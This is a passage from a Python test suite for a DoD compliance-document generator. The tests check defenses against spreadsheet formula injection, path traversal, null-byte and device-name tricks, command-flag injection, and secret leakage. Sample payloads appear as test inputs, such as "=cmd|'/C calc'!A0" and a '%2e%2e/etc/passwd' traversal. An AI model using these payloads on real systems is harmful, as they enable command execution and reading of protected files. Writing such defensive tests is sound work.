                os.path.join(TEMPLATES_DIR, "ssp", "SSP_IL5_Template.md"),
                min_tpl_dir / "ssp" / "SSP_IL5_Template.md",
            )

            def mock_hydrate_residue(target_dir, inv):
                out_d = Path(target_dir) / "ato_artifacts"
                tpl_d = file_helpers.get_templates_dir()
                res = {}
                hw_out = out_d / "HW_SW_Inventory" / "Hardware_Software_Inventory.xlsm"
                hw_out.parent.mkdir(parents=True, exist_ok=True)
                res["hwsw"] = excel_hydrator.HWSWHydrator(str(tpl_d / "hwsw" / "HWSWList_Template.xlsm")).hydrate(inv, str(hw_out))
                poam_out = out_d / "POAM" / "Plan_of_Action_and_Milestones.xlsm"
                poam_out.parent.mkdir(parents=True, exist_ok=True)
                res["poam"] = excel_hydrator.POAMHydrator(str(tpl_d / "poam" / "POAM_Export_Template.xlsm")).hydrate(inv, str(poam_out))
                ppsm_out = out_d / "PPSM" / "PPSM_Ports_Protocols_Services.xlsm"
                ppsm_out.parent.mkdir(parents=True, exist_ok=True)
                res["ppsm"] = excel_hydrator.PPSMHydrator(str(tpl_d / "ppsm" / "PPSMBoundariesInformationExport_Template.xlsm")).hydrate(inv, str(ppsm_out))
                return res

            with unittest.mock.patch("generate_compliance_artifacts.TEMPLATES_DIR", str(min_tpl_dir)):
                with unittest.mock.patch("excel_hydrator.hydrate_all_excel_templates", side_effect=mock_hydrate_residue):
                    # Step 2: Generate ATO artifacts
                    gen_results = generate_compliance_artifacts.generate_ato_artifacts(
                        ws_path, policy_format="both", data_format="both"
                    )
                self.assertGreater(len(gen_results["markdown"]), 0)
                self.assertGreater(len(gen_results["docx"]), 0)
                self.assertGreater(len(gen_results["yaml"]), 0)
                self.assertGreater(len(gen_results["excel"]), 0)

                # Verify every generated file is inside ws_path
                for fmt, file_list in gen_results.items():
                    for f_path in file_list:
                        resolved_f = Path(f_path).resolve()
                        self.assertTrue(
                            str(resolved_f).startswith(str(ws_path)),
                            f"Generated artifact {f_path} leaked outside workspace {ws_path}",
                        )

                # Step 3: Validate compliance package
                val_success = validate_compliance_artifacts.validate_compliance_package(ws_path)
                self.assertTrue(val_success)

        # After temporary directory is destroyed, verify workspace root / CWD is completely pristine
        current_cwd_entries = set(cwd_path.iterdir())
        leaked_entries = current_cwd_entries - initial_cwd_entries
        self.assertEqual(
            leaked_entries,
            set(),
            f"Artifact residue or temporary files leaked into CWD: {leaked_entries}",
        )
        self.assertFalse(
            (cwd_path / "ato_artifacts").exists(),
            "ato_artifacts must not be created loose in CWD",
        )
        self.assertFalse(
            (cwd_path / "system_inventory.json").exists(),
            "system_inventory.json must not be created loose in CWD",
        )

    def test_engine_robustness_and_boundary_fixes(self) -> None:
        """Tests recent robustness fixes and boundary condition handling.

        Verifies:
        1. validate_compliance_package returns False gracefully when ato_artifacts is missing.
        2. deep_scan_app_files isolates scans strictly to target folder without scanning os.getcwd().
        3. populate_placeholders replaces tokens with variable whitespace and preserves backslashes.
        4. is_table_separator correctly handles piped and pipeless markdown separators.
        5. parse_inline_formatting formats ***bold and italic*** tokens.
        6. service_catalog loads via get_skill_root and parses YAML safely.
        """
        # 1. validate_compliance_package returns False on missing directory
        with tempfile.TemporaryDirectory() as empty_tmp:
            res = validate_compliance_artifacts.validate_compliance_package(empty_tmp)
            self.assertFalse(res, "validate_compliance_package should return False when ato_artifacts is missing")

        # 2. deep_scan_app_files isolates scans strictly to target folder
        with tempfile.TemporaryDirectory() as isolated_tmp:
            isolated_path = Path(isolated_tmp)
            tf_sub = isolated_path / "terraform"
            tf_sub.mkdir()
            app_sub = isolated_path / "app"
            app_sub.mkdir()
            (app_sub / "package.json").write_text(
                json.dumps({"name": "test-sibling-app", "dependencies": {"express": "^4.18.2"}}),
                encoding="utf-8",
            )

            scanned = extract_system_data.deep_scan_app_files(str(tf_sub))
            app_names = [a.get("name") for a in scanned.get("applications", [])]
            self.assertIn("test-sibling-app", app_names)

        # 3. populate_placeholders with variable whitespace and backslashes
        test_content = (
            "System: {{  SYSTEM_NAME  }}\n"
            "Org: {{   ORGANIZATION_NAME   }}\n"
            "Abbr: { SYSTEM_ABBR }\n"
            "RegexVal: {{ ENCRYPTION_STANDARD }}"
        )
        test_inv = {
            "system_information": {
                "system_name": "Robust System",
                "organization": "Test Org",
                "system_abbreviation": "RS",
            },
            "encryption_summary": r"AES-256-GCM with \1 \g<0> path\to\key",
            "infrastructure_components": {},
            "application_components": {},
        }
        hydrated = generate_compliance_artifacts.populate_placeholders(test_content, test_inv)
        self.assertIn("System: Robust System", hydrated)
        self.assertIn("Org: Test Org", hydrated)
        self.assertIn("Abbr: RS", hydrated)
        self.assertIn(r"AES-256-GCM with \1 \g<0> path\to\key", hydrated)

        # 4. is_table_separator with and without outer pipes
        self.assertTrue(docx_generator.is_table_separator("| --- | :---: | ---: |"))
        self.assertTrue(docx_generator.is_table_separator("--- | :---: | ---:"))
        self.assertFalse(docx_generator.is_table_separator("| --- | | --- |"))
        self.assertFalse(docx_generator.is_table_separator("not a separator"))

        # 5. parse_inline_formatting with ***bold and italic***
        bold_italic_xml = docx_generator.parse_inline_formatting("***Crucial Notice***")
        self.assertIn("<w:b/>", bold_italic_xml)
        self.assertIn("<w:i/>", bold_italic_xml)
        self.assertIn("Crucial Notice", bold_italic_xml)

        # 6. service_catalog loads and resolves correctly
        cat = service_catalog.get_service_catalog()
        self.assertIsInstance(cat, dict)
        self.assertIn("cloudkms.googleapis.com", cat)

    def test_formula_injection_and_multibyte_truncation(self) -> None:
        """Tests formula injection (CWE-1236) and multi-byte grapheme truncation.

        Args:
            None.

        Returns:
            None.
        """
        # 1. Formula injection escaping
        self.assertEqual(file_helpers.clean_cell_value("=cmd|'/C calc'!A0"), "'=cmd|'/C calc'!A0")
        self.assertEqual(file_helpers.clean_cell_value("@SUM(B1:B10)"), "'@SUM(B1:B10)")
        self.assertEqual(file_helpers.clean_cell_value("|'cmd'"), "'|'cmd'")
        self.assertEqual(file_helpers.clean_cell_value("%COMSPEC%"), "'%COMSPEC%")
        self.assertEqual(file_helpers.clean_cell_value("+cmd|' /C calc'!A0"), "'+cmd|' /C calc'!A0")
        self.assertEqual(file_helpers.clean_cell_value("-some_var_name"), "'-some_var_name")

        # 2. Valid numeric strings and numbers preserved
        self.assertEqual(file_helpers.clean_cell_value("+123"), "+123")
        self.assertEqual(file_helpers.clean_cell_value("-45.67"), "-45.67")
        self.assertEqual(file_helpers.clean_cell_value("+1.5e-3"), "+1.5e-3")
        self.assertEqual(file_helpers.clean_cell_value("-2E4"), "-2E4")
        self.assertEqual(file_helpers.clean_cell_value(42), 42)
        self.assertEqual(file_helpers.clean_cell_value(-3.14), -3.14)
        self.assertEqual(file_helpers.clean_cell_value(True), True)
        self.assertEqual(file_helpers.clean_cell_value(False), False)

        # 3. Truncation preserving grapheme cluster / combining character boundary
        prefix = "A" * 32756
        combining_char = "\u0301"  # Combining acute accent
        test_str = prefix + "e" + combining_char + "BCD" * 5
        cleaned = file_helpers.clean_cell_value(test_str)
        self.assertIsInstance(cleaned, str)
        self.assertTrue(cleaned.endswith("..."))
        self.assertLessEqual(len(cleaned), 32767)

        content_before_dots = cleaned[:-3]
        if content_before_dots:
            last_char = content_before_dots[-1]
            self.assertEqual(
                unicodedata.combining(last_char),
                0,
                "Truncation must not leave dangling combining mark before ellipsis",
            )
            self.assertNotEqual(last_char, "\u200D", "Truncation must not leave dangling ZWJ")

        # 4. XML 1.0 illegal characters stripped while UTF-8 preserved
        xml_dirty = "Clean \x00\x08\x0B\x0C\x0E\x1F text with \u4e16\u754c \U0001F600"
        xml_clean = file_helpers.escape_xml_text(xml_dirty)
        self.assertNotIn("\x00", xml_clean)
        self.assertNotIn("\x08", xml_clean)
        self.assertIn("Clean", xml_clean)
        self.assertIn("世界", xml_clean)

    def test_security_defenses_and_secret_redaction(self) -> None:
        """Tests boundary defenses, path traversal, device names, and secret scrubbing.

        Args:
            None.

        Returns:
            None.
        """
        boundary = Path(self.test_dir).resolve()

        # 1. Null byte in target path
        with self.assertRaises(PermissionError):
            file_helpers.ensure_path_within_boundary(f"{boundary}/sub\x00file.txt", boundary)

        # 2. URL-encoded path traversal
        with self.assertRaises(PermissionError):
            file_helpers.ensure_path_within_boundary(f"{boundary}/%2e%2e/etc/passwd", boundary)

        # 3. Windows reserved device name in path
        with self.assertRaises(PermissionError):
            file_helpers.ensure_path_within_boundary(f"{boundary}/NUL", boundary)
        with self.assertRaises(PermissionError):
            file_helpers.ensure_path_within_boundary(f"{boundary}/aux.txt", boundary)

        # 4. sanitize_filename rejects device names and empty
        with self.assertRaises(ValueError):
            file_helpers.sanitize_filename("CON")
        with self.assertRaises(ValueError):
            file_helpers.sanitize_filename("prn.txt")
        with self.assertRaises(ValueError):
            file_helpers.sanitize_filename("...")

        # 5. Secret scrubbing for PEM keys and high-entropy cloud credentials
        secret_payload = {
            "normal_field": "public_config",
            "gcp_api_key": "AIzaSyD-1234567890abcdefghijklmnopqrstuv",
            "aws_access_key": "AKIAIOSFODNN7EXAMPLE",
            "github_token": "ghp_123456789012345678901234567890123456",
            "embedded_secret": "Key is ya29.a0AfH6SMD_example_oauth_token_1234567890",
            "pem_block": (
                "-----BEGIN PRIVATE KEY-----\n"
                "MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC...\n"
                "-----END PRIVATE KEY-----"
            ),
        }
        scrubbed = file_helpers.scrub_sensitive_data(secret_payload)
        self.assertEqual(scrubbed["normal_field"], "public_config")
        self.assertEqual(scrubbed["gcp_api_key"], "[REDACTED_SENSITIVE]")
        self.assertEqual(scrubbed["aws_access_key"], "[REDACTED_SENSITIVE]")
        self.assertEqual(scrubbed["github_token"], "[REDACTED_SENSITIVE]")
        self.assertEqual(scrubbed["embedded_secret"], "[REDACTED_SENSITIVE]")
        self.assertEqual(scrubbed["pem_block"], "[REDACTED_SENSITIVE]")

    def test_export_strategies_registry_and_dry_helpers(self) -> None:
        """Tests Strategy pattern decoupling, registry state isolation, and DRY helpers.

        Args:
            None.

        Returns:
            None.
        """
        # 1. Defensive copy check
        policy_exporters = export_strategies.ExporterRegistry.get_registered_policy_exporters()
        policy_exporters["fake"] = export_strategies.MarkdownPolicyExporter()
        self.assertNotIn(
            "fake",
            export_strategies.ExporterRegistry.get_registered_policy_exporters(),
            "Mutating returned dict must not mutate internal registry state",
        )

        # 2. Reset defaults
        export_strategies.ExporterRegistry.clear()
        self.assertEqual(
            len(export_strategies.ExporterRegistry.get_registered_policy_exporters()), 0
        )
        export_strategies.ExporterRegistry.reset_defaults()
        self.assertIn(
            "markdown", export_strategies.ExporterRegistry.get_registered_policy_exporters()
        )
        self.assertIn(
            "docx", export_strategies.ExporterRegistry.get_registered_policy_exporters()
        )

        # 3. Comma-separated format resolution
        resolved_policies = export_strategies.ExporterRegistry.get_policy_exporters(
            "markdown, docx"
        )
        self.assertEqual(len(resolved_policies), 2)
        policy_names = {e.format_name for e in resolved_policies}
        self.assertEqual(policy_names, {"markdown", "docx"})

        resolved_data = export_strategies.ExporterRegistry.get_data_exporters("yaml, excel")
        self.assertEqual(len(resolved_data), 2)
        data_names = {d.format_name for d in resolved_data}
        self.assertEqual(data_names, {"yaml", "excel"})

        # 4. Test YamlDataExporter DRY helper _export_template_matrix
        yaml_exporter = export_strategies.YamlDataExporter()
        tpl_file = Path(TEMPLATES_DIR) / "sctm" / "SCTM_Template.yaml"
        self.assertTrue(tpl_file.exists(), f"Authoritative SCTM template must exist at {tpl_file}")
        out_root = Path(self.test_dir) / "ato_artifacts"
        res = yaml_exporter._export_template_matrix(
            template_file=tpl_file,
            output_folder=out_root / "SCTM",
            output_filename="Test_SCTM.yaml",
            version_key="sctm",
            out_dir=out_root,
            inventory=self.mock_inventory,
            doc_versions={"sctm": "1.2.3"},
            pop_fn=generate_compliance_artifacts.populate_placeholders,
        )
        self.assertIsNotNone(res)
        self.assertTrue(res.exists())
        content = res.read_text(encoding="utf-8")
        self.assertNotIn("<mark", content)
        self.assertNotIn("class=\"badge", content)
        parsed_yaml = file_helpers.read_yaml_file(res)
        self.assertIsInstance(parsed_yaml, dict)

    def test_incident_response_runbooks_and_military_overlays(self) -> None:
        """Tests domain accuracy of IR Runbooks, SCC IL4/IL5 boundary, and military overlays.

        Args:
            None.

        Returns:
            None.
        """
        runbooks_dir = Path(TEMPLATES_DIR) / "runbooks"
        runbook_files = [
            "IR_Compute_Resource_Compromise_Runbook.md",
            "IR_IAM_Compromised_Credentials_Runbook.md",
            "IR_KMS_CMEK_Compromise_Runbook.md",
            "IR_Network_Intrusion_Runbook.md",
            "IR_VPC_Service_Controls_Violation_Runbook.md",
        ]
        for rb_name in runbook_files:
            rb_path = runbooks_dir / rb_name
            self.assertTrue(rb_path.exists(), f"Runbook {rb_name} must exist")
            content = rb_path.read_text(encoding="utf-8")
            self.assertIn(
                "DoD IL4 / DoD IL5",
                content,
                f"{rb_name} must contain DoD IL4/IL5 guidance",
            )
            self.assertIn(
                "roles/securitycenter",
                content,
                f"{rb_name} must mention roles/securitycenter boundary",
            )
            self.assertIn(
                "Army RCERT",
                content,
                f"{rb_name} must contain Army RCERT escalation",
            )
            self.assertIn(
                "616th Operations Center",
                content,
                f"{rb_name} must contain 616 OC escalation",
            )
            self.assertIn(
                "NAVIFOR / NCDOC",
                content,
                f"{rb_name} must contain NAVIFOR/NCDOC escalation",
            )
            self.assertIn(
                "MCCOG",
                content,
                f"{rb_name} must contain MCCOG escalation",
            )
            self.assertIn(
                "Space Delta 6",
                content,
                f"{rb_name} must contain Space Delta 6 escalation",
            )
            self.assertIn(
                "CJCSM 6510.01B",
                content,
                f"{rb_name} must reference CJCSM 6510.01B timelines",
            )

        # Verify Path_to_Authorization.md military overlay generation via validate_compliance_package
        inv_path = os.path.join(self.test_dir, "system_inventory.json")
        with open(inv_path, "w", encoding="utf-8") as inv_file:
            json.dump(self.mock_inventory, inv_file)
        ato_dir = os.path.join(self.test_dir, "ato_artifacts")
        ssp_dir = os.path.join(ato_dir, "SSP")
        os.makedirs(ssp_dir, exist_ok=True)
        with open(os.path.join(ssp_dir, "System_Security_Plan.md"), "w", encoding="utf-8") as ssp_file:
            ssp_file.write("# System Security Plan\n\nBaseline content.\n")

        validate_compliance_artifacts.validate_compliance_package(self.test_dir)
        pta_path = os.path.join(ato_dir, "Path_to_Authorization.md")
        self.assertTrue(os.path.exists(pta_path))
        pta_content = Path(pta_path).read_text(encoding="utf-8")
        self.assertIn("Military Service Branch & Federal Agency Governance Overlays", pta_content)
        self.assertIn("Army RCERT", pta_content)
        self.assertIn("616th Operations Center", pta_content)
        self.assertIn("NAVIFOR / NCDOC", pta_content)
        self.assertIn("MCCOG", pta_content)
        self.assertIn("Space Delta 6", pta_content)
        self.assertIn("CJCSM 6510.01B", pta_content)

    def test_yaml_scalar_quoting_and_tfvars_robustness(self) -> None:
        """Verifies safe YAML scalar quoting roundtrip and robust HCL/tfvars parsing.

        Args:
            None.

        Returns:
            None.
        """
        import file_helpers

        # 1. safe_yaml_scalar encoding & roundtrip
        test_cases = [
            "Simple System Name",
            'System with "Double Quotes"',
            "System with 'Single Quotes'",
            'Complex "Quotes" & Backslash \\ Path',
            "Multiline\nDescription\tWith Tabs",
            "Leading : and # symbols: #notacomment",
        ]
        for original in test_cases:
            encoded = file_helpers.safe_yaml_scalar(original)
            yaml_content = f"system_metadata:\n  name: {encoded}\n"
            parsed = file_helpers.parse_yaml_safe(yaml_content)
            roundtrip_val = parsed.get("system_metadata", {}).get("name")
            self.assertEqual(
                roundtrip_val,
                original,
                f"YAML roundtrip failed for {original!r}: got {roundtrip_val!r}",
            )

        # 2. Primitives handling in safe_yaml_scalar
        self.assertEqual(file_helpers.safe_yaml_scalar(None), '""')
        self.assertEqual(file_helpers.safe_yaml_scalar(True), "true")
        self.assertEqual(file_helpers.safe_yaml_scalar(False), "false")
        self.assertEqual(file_helpers.safe_yaml_scalar(443), "443")
        self.assertEqual(file_helpers.safe_yaml_scalar(3.1415), "3.1415")

        # 3. parse_tfvars_content robustness
        tfvars_content = """
        simple_key        = "normal_value"
        escaped_quote_key = "value with \\"internal\\" quotes"
        negative_num      = -42
        float_num         = 3.14
        boolean_val       = true
        heredoc_val       = <<-EOT
          multiline
          heredoc text
        EOT
        list_with_commas  = ["10.0.0.0/16,10.1.0.0/16", "10.2.0.0/16", "unquoted_elem"]
        secret_password   = "SuperSecretPassword123"
        """
        parsed_tfvars = extract_system_data.parse_tfvars_content(tfvars_content)
        self.assertEqual(parsed_tfvars.get("simple_key"), "normal_value")
        self.assertEqual(
            parsed_tfvars.get("escaped_quote_key"),
            'value with "internal" quotes',
        )
        self.assertEqual(parsed_tfvars.get("negative_num"), -42)
        self.assertEqual(parsed_tfvars.get("float_num"), 3.14)
        self.assertTrue(parsed_tfvars.get("boolean_val"))
        self.assertIn("heredoc text", parsed_tfvars.get("heredoc_val", ""))
        self.assertEqual(
            parsed_tfvars.get("list_with_commas"),
            ["10.0.0.0/16,10.1.0.0/16", "10.2.0.0/16", "unquoted_elem"],
        )
        self.assertEqual(
            parsed_tfvars.get("secret_password"), "[REDACTED_SENSITIVE]"
        )

        # 4. extract_hcl_attr with escaped quotes and nested attributes
        hcl_block = """
        resource "google_compute_instance" "bastion" {
          name         = "bastion-\\"jump\\"-host"
          machine_type = "e2-standard-4"
          can_ip_forward = true
          labels = {
            environment = "staging-il5"
          }
        }
        """
        extracted_name = extract_system_data.extract_hcl_attr(
            hcl_block, "name"
        )
        self.assertEqual(extracted_name, 'bastion-"jump"-host')
        extracted_ip = extract_system_data.extract_hcl_attr(
            hcl_block, "can_ip_forward"
        )
        self.assertTrue(extracted_ip)
        extracted_env = extract_system_data.extract_hcl_attr(
            hcl_block, "labels.environment"
        )
        self.assertEqual(extracted_env, "staging-il5")

    def test_dynamic_derivations_and_sanitization_edge_cases(self) -> None:
        """Tests formula injection evasion defenses, URL-encoded null bytes, and dynamic derivation.

        Args:
            None.

        Returns:
            None.
        """
        # 1. clean_cell_value evasion (leading whitespace, zero-width space, numeric signs)
        self.assertEqual(
            file_helpers.clean_cell_value("  =cmd|' /C calc'!A0"),
            "'=cmd|' /C calc'!A0",
        )
        self.assertEqual(
            file_helpers.clean_cell_value("\t@SUM(A1:A5)"),
            "'@SUM(A1:A5)",
        )
        self.assertEqual(
            file_helpers.clean_cell_value("\u200b=1+1"),
            "'=1+1",
        )
        self.assertEqual(
            file_helpers.clean_cell_value("  -42.5  "),
            "-42.5",
        )
        self.assertEqual(
            file_helpers.clean_cell_value("  +123  "),
            "+123",
        )
        self.assertEqual(
            file_helpers.clean_cell_value("  +cmd  "),
            "'+cmd",
        )

        # 2. sanitize_filename encoded and double-encoded null bytes
        cleaned_enc = file_helpers.sanitize_filename("report%00_2026.docx")
        self.assertNotIn("\x00", cleaned_enc)
        self.assertNotIn("%00", cleaned_enc)
        self.assertEqual(cleaned_enc, "report_2026.docx")

        cleaned_double = file_helpers.sanitize_filename("test%2500.txt")
        self.assertNotIn("\x00", cleaned_double)
        self.assertEqual(cleaned_double, "test.txt")

        # 3. infer_cloud_provider heuristics
        tf_gcp = {
            "all_resources": [{"type": "google_compute_instance"}],
            "modules_used": [],
        }
        self.assertEqual(
            extract_system_data.infer_cloud_provider(tf_gcp, {}),
            "Google Cloud Platform (GCP)",
        )

        # Explicit configuration override
        cfg_custom = {"cloud_provider": "Google Cloud Assured Workloads FedRAMP High"}
        self.assertEqual(
            extract_system_data.infer_cloud_provider(tf_gcp, cfg_custom),
            "Google Cloud Assured Workloads FedRAMP High",
        )

        # Default fallback without explicit config
        tf_empty = {"all_resources": [], "modules_used": []}
        self.assertEqual(
            extract_system_data.infer_cloud_provider(tf_empty, {}),
            "Google Cloud Platform (GCP)",
        )

        # 4. BaseExcelHydrator subclass verification
        self.assertTrue(
            issubclass(excel_hydrator.HWSWHydrator, excel_hydrator.BaseExcelHydrator)
        )
        self.assertTrue(
            issubclass(excel_hydrator.POAMHydrator, excel_hydrator.BaseExcelHydrator)
        )
        self.assertTrue(
            issubclass(excel_hydrator.PPSMHydrator, excel_hydrator.BaseExcelHydrator)
        )
        self.assertTrue(
            issubclass(excel_hydrator.SCTMHydrator, excel_hydrator.BaseExcelHydrator)
        )

        # 5. versions.tf terraform block parsing
        v_path = os.path.join(self.test_dir, "versions.tf")
        with open(v_path, "w", encoding="utf-8") as v_file:
            v_file.write("""
            terraform {
              required_version = ">= 1.5.0"
              required_providers {
                google = {
                  source  = "hashicorp/google"
                  version = ">= 5.0.0, < 6.0.0"
                }
              }
            }
            """)
        tf_scanned = extract_system_data.deep_scan_tf_files(self.test_dir)
        self.assertEqual(
            tf_scanned.get("terraform_engine_version"), ">= 1.5.0"
        )
        self.assertEqual(
            tf_scanned.get("provider_versions", {}).get("google"),
            ">= 5.0.0, < 6.0.0",
        )

    def test_cloud_adaptive_derivations_and_subtitles(self) -> None:
        """Tests cloud-adaptive derivations, dynamic subtitles, and STIG triggers.

        Verifies that:
        1. docx_generator derives document-specific subtitles for Runbooks, PTA,
           SSP, FIPS, and standard policies.
        2. populate_placeholders correctly expands {{ CLOUD_PROVIDER }} and {{ CSP_ABBR }}.
        3. format_separation_of_duties_table dynamically prefixes admin groups with CSP.
        4. discover_workload_technology_stigs triggers Storage SRG when storage_buckets
           are present without explicit API service names.
        5. HWSW asset inventory reflects GCP Compute Engine and Foundations Fabric naming.

        Args:
            None.

        Returns:
            None.
        """
        metadata = {
            "system_information": {
                "compliance_baseline": "NIST SP 800-53 Rev. 5",
                "impact_level": "IL5",
                "organization": "Test Organization",
            }
        }

        # 1. Runbook subtitle & app.xml
        rb_docx = os.path.join(self.test_dir, "runbook_test.docx")
        docx_generator.convert_markdown_to_docx(
            "# Incident Response Runbook for Cloud Intrusions\n\nRunbook content.",
            rb_docx,
            metadata,
        )
        with zipfile.ZipFile(rb_docx) as z_file:
            doc_xml = z_file.read("word/document.xml").decode("utf-8")
            self.assertIn("Tactical Incident Response Operational Runbook", doc_xml)
            app_xml = z_file.read("docProps/app.xml").decode("utf-8")
            self.assertIn("Test Organization", app_xml)

        # 2. PTA subtitle
        pta_docx = os.path.join(self.test_dir, "pta_test.docx")
        docx_generator.convert_markdown_to_docx(
            "# Path to Authorization Roadmap\n\nRoadmap content.",
            pta_docx,
            metadata,
        )
        with zipfile.ZipFile(pta_docx) as z_file:
            doc_xml = z_file.read("word/document.xml").decode("utf-8")
            self.assertIn("Master Authorization Roadmap", doc_xml)

        # 3. SSP subtitle
        ssp_docx = os.path.join(self.test_dir, "ssp_test.docx")
        docx_generator.convert_markdown_to_docx(
            "# System Security Plan (SSP)\n\nSSP content.",
            ssp_docx,
            metadata,
        )
        with zipfile.ZipFile(ssp_docx) as z_file:
            doc_xml = z_file.read("word/document.xml").decode("utf-8")
            self.assertIn(
                "System Security Plan (SSP) &amp; Control Implementation Specification",
                doc_xml,
            )

        # 4. FIPS subtitle
        fips_docx = os.path.join(self.test_dir, "fips_test.docx")
        docx_generator.convert_markdown_to_docx(
            "# FIPS Cryptographic Module Validation Matrix\n\nMatrix content.",
            fips_docx,
            metadata,
        )
        with zipfile.ZipFile(fips_docx) as z_file:
            doc_xml = z_file.read("word/document.xml").decode("utf-8")
            self.assertIn(
                "FIPS 140-2 / FIPS 140-3 Cryptographic Module Validation Matrix",
                doc_xml,
            )

        # 5. Standard Policy subtitle
        pol_docx = os.path.join(self.test_dir, "policy_test.docx")
        docx_generator.convert_markdown_to_docx(
            "# Access Control Policy and Procedures\n\nPolicy content.",
            pol_docx,
            metadata,
        )
        with zipfile.ZipFile(pol_docx) as z_file:
            doc_xml = z_file.read("word/document.xml").decode("utf-8")
            self.assertIn(
                "NIST SP 800-53 Rev. 5 Compliance Policy &amp; Technical Controls Manual",
                doc_xml,
            )

        # 6. Placeholder expansion and separation of duties for GCP Foundations Fabric
        inv_gcp = {
            "system_information": {
                "system_name": "Test GCP Platform",
                "system_abbreviation": "TGP",
                "cloud_provider": "Google Cloud Platform (GCP)",
                "cloud_service_provider_abbr": "GCP",
                "impact_level": "IL5",
                "compliance_baseline": "DoD IL5",
                "organization": "Defense Logistics",
            },
            "infrastructure_components": {
                "services_enabled": ["compute.googleapis.com", "storage.googleapis.com"],
                "modules_used": [],
                "all_resources": [],
                "storage_buckets": [
                    {"name": "bkt-audit-logs", "location": "us-central1"}
                ],
                "compute_instances": [
                    {
                        "name": "bastion-gce",
                        "type": "google_compute_instance",
                        "machine_type": "n2-standard-4",
                    }
                ],
            },
            "network_architecture": {},
            "personnel_roles": {},
        }

        template_text = (
            "System {{ SYSTEM_NAME }} on {{ CLOUD_PROVIDER }} ({{ CSP_ABBR }})."
        )
        rendered = generate_compliance_artifacts.populate_placeholders(
            template_text, inv_gcp
        )
        self.assertIn("Test GCP Platform", rendered)
        self.assertIn("Google Cloud Platform (GCP)", rendered)
        self.assertIn("(GCP)", rendered)

        sod_table = (
            generate_compliance_artifacts.format_separation_of_duties_table(inv_gcp)
        )
        self.assertIn("gcp-organization-admins", sod_table)
        self.assertIn("gcp-security-admins", sod_table)
        self.assertIn("Baseline GCP Foundation", sod_table)
        self.assertIn("resourcemanager.organizationAdmin", sod_table)
        self.assertIn("assuredworkloads.admin", sod_table)

        # 7. Storage STIG discovery without explicit storage service
        stigs = validate_compliance_artifacts.discover_workload_technology_stigs(
            inv_gcp
        )
        stig_slugs = [s["slug"] for s in stigs]
        self.assertIn("storage_area_network_san_srg", stig_slugs)

        # 8. Prototype vendor codename removal check (nokia / c8000 must NOT trigger cisco STIG)
        inv_fake_vendor = {
            "infrastructure_components": {
                "compute_instances": [{"name": "nokia-edge-gw", "type": "virtual_machine"}],
            }
        }
        stigs_fake = validate_compliance_artifacts.discover_workload_technology_stigs(inv_fake_vendor)
        self.assertNotIn("cisco_ios_xe_router_srg", [s["slug"] for s in stigs_fake])

        # 9. HWSW YAML generation with GCP assets & KMS
        inv_gcp["infrastructure_components"]["kms_keys"] = [
            {"name": "cmek-app-key", "location": "us-central1", "protection_level": "HSM"}
        ]
        yaml_out = generate_compliance_artifacts.generate_hwsw_inventory_yaml(
            inv_gcp
        )
        self.assertIn("Google Compute Engine VM Instance", yaml_out)
        self.assertIn("Google Cloud Platform (GCP)", yaml_out)
        self.assertIn("Cloud KMS FIPS 140-3 Level 3 HSM Key Ring", yaml_out)
        self.assertIn("cloudkms.googleapis.com", yaml_out)



    def test_security_defusedxml_mandatory_enforcement(self) -> None:
        """Verifies XML parsing uses defusedxml if available, or falls back securely to standard library."""
        import validate_compliance_artifacts
        import test_compliance_engine

        # Verify that ET module exposes fromstring
        self.assertTrue(
            hasattr(validate_compliance_artifacts.ET, "fromstring"),
            "ET must expose fromstring",
        )
        self.assertTrue(
            "xml.etree.ElementTree" in validate_compliance_artifacts.ET.__name__
            or "defusedxml" in validate_compliance_artifacts.ET.__name__
            or "safe_xml" in validate_compliance_artifacts.ET.__name__,
            "validate_compliance_artifacts must use defusedxml.ElementTree or standard xml.etree.ElementTree or safe_xml",
        )
        self.assertTrue(
            "xml.etree.ElementTree" in ET.__name__
            or "defusedxml" in ET.__name__
            or "safe_xml" in ET.__name__,
            "test_compliance_engine must use defusedxml.ElementTree or standard xml.etree.ElementTree or safe_xml",
        )

    def test_security_scanner_bridge_flag_injection_defense(self) -> None:
        """Verifies scanner bridge defense against flag injection via leading hyphens."""
        from unittest.mock import MagicMock
        import security_scanner_bridge as ssb

        # Create a mock target directory name starting with a hyphen
        hyphen_dir = os.path.join(self.test_dir, "--evil-flag")
        os.makedirs(hyphen_dir, exist_ok=True)

        checkov_cmd_captured = []
        def mock_checkov_runner(cmd_args, **kwargs):
            checkov_cmd_captured.append(cmd_args)
            mock_proc = MagicMock()
            mock_proc.returncode = 0
            mock_proc.args = cmd_args
            return MagicMock(__enter__=MagicMock(return_value=mock_proc))
            
        # Checkov call: should resolve to absolute path starting with / and use --directory
        ssb.run_checkov_scan(hyphen_dir, runner=mock_checkov_runner)
        self.assertTrue(len(checkov_cmd_captured) > 0)
        checkov_cmd = checkov_cmd_captured[0]
        self.assertIn("--directory", checkov_cmd)
        dir_idx = checkov_cmd.index("--directory") + 1
        self.assertTrue(
            checkov_cmd[dir_idx].startswith("/"),
            "Checkov directory target must be resolved to absolute path",
        )

        semgrep_cmd_captured = []
        def mock_semgrep_runner(cmd_args, **kwargs):
            semgrep_cmd_captured.append(cmd_args)
            mock_proc = MagicMock()
            mock_proc.returncode = 0
            mock_proc.args = cmd_args
            return MagicMock(__enter__=MagicMock(return_value=mock_proc))
            
        # Semgrep call: should resolve to absolute path and use '--' positional separation
        ssb.run_semgrep_scan(hyphen_dir, runner=mock_semgrep_runner)
        self.assertTrue(len(semgrep_cmd_captured) > 0)
        semgrep_cmd = semgrep_cmd_captured[0]
        self.assertIn("--", semgrep_cmd, "Semgrep command must use '--' argument separator")
        sep_idx = semgrep_cmd.index("--")
        target_arg = semgrep_cmd[sep_idx + 1]
        self.assertTrue(
            target_arg.startswith("/"),
            "Semgrep target must be resolved to absolute path after '--'",
        )

    def test_cwe_1236_formula_injection_bypass_hardening(self) -> None:
        """Verifies universal mitigation against CWE-1236 CSV/Excel formula injection."""
        from file_helpers import clean_cell_value, MAX_EXCEL_CELL_LENGTH

        self.assertEqual(MAX_EXCEL_CELL_LENGTH, 32760)

        # 1. Standard trigger characters neutralized with single quote prefix
        self.assertTrue(clean_cell_value("=cmd|' /C calc'!A0").startswith("'"))
        self.assertTrue(clean_cell_value("+cmd").startswith("'"))
        self.assertTrue(clean_cell_value("-some_text").startswith("'"))
        self.assertTrue(clean_cell_value("@SUM(A1:A10)").startswith("'"))

        # 2. Semicolon-prefixed bypasses neutralized
        self.assertTrue(clean_cell_value(";=cmd").startswith("'"))
